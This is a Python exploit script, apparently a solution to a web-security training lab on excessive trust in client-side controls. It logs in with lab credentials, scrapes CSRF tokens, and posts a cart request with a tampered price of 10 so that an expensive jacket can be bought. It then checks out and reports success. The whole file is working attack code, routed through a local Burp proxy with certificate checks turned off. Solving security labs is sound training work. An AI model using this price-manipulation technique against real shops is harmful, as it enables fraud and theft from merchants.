#Problem -> Excessive trust in client side controls

import requests
import urllib3
import sys
from bs4 import BeautifulSoup
from colorama import Fore,Back,Style,init
#init(autoreset=True)

#defining color pattern
green = Fore.GREEN
bright = Style.BRIGHT
reset = Style.RESET_ALL
print(bright,green)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#using proxies to redirect all request through burp for easy decode in case of error

proxies = {
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080"
}

#using get_csrf function to get csrf token from response 

def get_csrf(s,url):
    res = s.get(url,verify=False,proxies=proxies)
    soup = BeautifulSoup(res.text,"html.parser")
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

#buy_jacket function is performing complete actions

print()
def buy_jacket(s,url):
    login_url = url + "/login"
    csrf_token = get_csrf(s,login_url)
    data = {"csrf":csrf_token,
            "username":"wiener",
            "password":"peter"}
    
    # here we are trying to logged in application

    res = s.post(login_url,data=data,verify=False,proxies=proxies)
    if "Log out" in res.text:
        print("[+] Successfully logged in as wiener")

        # adding jacket into cart

        cart_url = url + "/cart"
        cart_data = {
            "productId":1,
            "redir":"PRODUCT",
            "quantity":1,
            "price":10
        }
        cart_res = s.post(cart_url,data=cart_data,verify=False,proxies=proxies)
        
        # finallly Buying jacket

        buying_url = url + "/cart/checkout"
        checkout_csrf = get_csrf(s,cart_url)
        checkout_data = {
            'csrf':checkout_csrf
        }
        checkout_res = s.post(buying_url,data=checkout_data,verify=False,proxies=proxies)

        #checking success

        if "Congratulations" in checkout_res.text:
            print("[+] Successfully exploited Vulnerability")
        else:
            print("[-] Not able to exploit")


    
    else:
        print("[-] Unable to logged in application")


def main():
    if len(sys.argv) != 2:
        print("[-] Usage : python3 {} <target-url>".format(sys.argv[0]))
        sys.exit(-1)
    else:
        s = requests.Session()
        url = sys.argv[1]
        buy_jacket(s,url)
        

if __name__=="__main__":
    main()


print(reset)

